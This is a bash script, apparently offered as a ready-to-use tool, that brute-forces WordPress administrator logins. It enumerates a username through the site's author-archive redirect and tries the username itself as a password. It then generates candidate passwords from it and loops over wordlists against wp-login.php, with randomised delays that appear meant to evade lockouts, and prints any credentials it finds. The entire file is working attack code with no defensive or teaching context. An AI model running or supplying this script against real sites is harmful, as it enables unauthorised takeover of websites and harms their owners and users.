#!/bin/bash
# Brute Force Wordpress [Gat Username & Generate Password]
# Author : Suhada \\ https://github.com/suhada99 //
# Home Page : https:///zerobyte.id

useragent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0";
chkLogin(){
	url=$1;
	hOme=$(timeout 1 curl -s -w %{url_effective} -o /dev/null "${url}");
	echo "[*] Try Log In";
	deFaultLogin=$(timeout 6 curl -s -X POST -Ls -b cookie-site.tmp --cookie-jar cookie-login.tmp -X POST -d "log=${gEtU}&pwd=${gEtU}&wp-submit=Log+In&redirect_to=${hOme}/wp-admin/&testcookie=1" -e "${hOme}/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" "${hOme}/wp-login.php");
	if [[ $deFaultLogin =~ 'wp-link-submit' ]]; then
		echo "[+] Username & Password FOUND!";
		echo " URL : ${hOme}/wp-login.php";
		echo " Username : ${gEtU}";
		echo " Password : ${gEtU}";
	else
		rm cookie-site.tmp page-site.html -f
		echo "[*] Start Brute Force!";
		for pW in $(cat password/*.txt); do
			tiMeRandom=$(shuf -i 1-10 -n 1);
			echo "Wait For $tiMeRandom Seconds | Try Login!";
			chkLogindaShboard=$(sleep "${tiMeRandom}s" && timeout 5 curl -s -X POST -Ls -b cookie-login.tmp -X POST -d "log=${gEtU}&pwd=${pW}&wp-submit=Log+In&redirect_to=${hOme}/wp-admin/&testcookie=1" -e "${hOme}/wp-login.php" -H "Content-Type: application/x-www-form-urlencoded" "${hOme}/wp-login.php");
			if [[ $chkLogindaShboard =~ 'wp-link-submit' ]]; then
				echo "[+] Username & Password FOUND!";
				echo " URL : ${hOme}/wp-login.php";
				echo " Username : ${gEtU}";
				echo " Password : ${pW}";
				rm cookie-login.tmp password/G-Password.txt -f
				exit
			fi
		done
	fi
}

chkUseR() {
	url=$1;
	ChKU=$(timeout 5 curl -Ls -b cookie-site.tmp -o /dev/null -w %{url_effective} "${url}/?author=1");
	gEtU=$(wget -q "${ChKU}" -O page-site.html && cat page-site.html | grep 'Posts by' | head -1 | grep -Po '(?<=Posts by ).*?(?= Feed")');
	if [[ -z $gEtU ]]; then
		echo "[X] Failed Get Username";
		exit
	else
		echo "[+] Username : $gEtU";
		echo "[*] Generate Password";
		for gPass in $(cat Generate.txt); do
			echo "$gEtU$gPass" >> password/G-Password.txt
		done
		echo "[+] Generate Password Done!"
		chkLogin $url
		sleep 3s
	fi

}

chkPageLogin() {
	url=$1;
	ChKurL=$(timeout 5 curl -Ls -A "${useragent}" -o /dev/null -w %{url_effective} "${url}/wp-login.php");
	ChKPG=$(timeout 10 curl -s --cookie-jar cookie-site.tmp -A "${useragent}" -w %{http_code} $ChKurL -o /dev/null);
	if [[ $ChKPG =~ '200' ]]; then
		echo "[+] Page Login OK";
		echo "[*] Get Username";
		chkUseR $url;
	else
		echo "[X] Page Not Found!";
	fi
}

chkPageLogin $1
rm cookie-login.tmp password/G-Password.txt -f